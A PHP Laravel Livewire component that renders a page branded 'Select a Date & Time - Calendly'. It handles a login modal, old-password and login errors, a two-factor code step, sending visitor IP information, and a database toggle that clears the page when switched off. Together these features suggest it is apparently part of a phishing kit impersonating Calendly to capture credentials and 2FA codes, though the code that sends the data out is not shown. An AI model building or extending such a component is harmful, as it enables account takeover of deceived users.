<?php

namespace App\Livewire;

use Livewire\Attributes\Layout;
use Livewire\Attributes\Title;
use Livewire\Component;

class Home extends Component
{
    public $loginError = false;
    public $oldPassError = false;
    public $enableLoginForm = true;
    public $showModalFooter = true;
    public $enableLoadingAfterSubmit = false;
    public $twoFaPage = false;
    public $codeError = false;
    public $showCalender = false;
    public $showCalenderProgress = false;

    public $ip;
    public $webStatus = 0;
    protected $listeners = ['calender','calenderInit','statusCheck'];
    public function mount()
    {
        $this->dispatch('user-login-response');
        $this->statusCheck();
    }

    public function boot()
    {
        $this->statusCheck();
    }
    public function statusCheck()
    {
        $this->webStatus = @\App\Models\WebsiteStatus::first()->status ?? 0;
        if ($this->webStatus == 0){
            $this->dispatch('clear-all');
        }
    }
    public function codeSubmit()
    {
        $this->dispatch('code-submit');
    }
    public function codeSubmitMobile()
    {
        $this->dispatch('code-submit-mobile');
    }
    public function submitLogin()
    {
        $this->dispatch('show-login-progress');
    }
    public function openLoginModal()
    {
        $this->loginError = false;
        $this->enableLoginForm = true;
        $this->showModalFooter = true;
        $this->dispatch('open-modal');
        $this->dispatch('send-ip-info');
    }

    public function calenderInit()
    {
        $this->dispatch('calender-init');
    }
    public function calender()
    {
        $this->redirect(route('calendar-calendly'),true);
    }
    #[Layout('app')]
    #[Title('Select a Date & Time - Calendly')]
    public function render()
    {
        return view('livewire.home');
    }
}
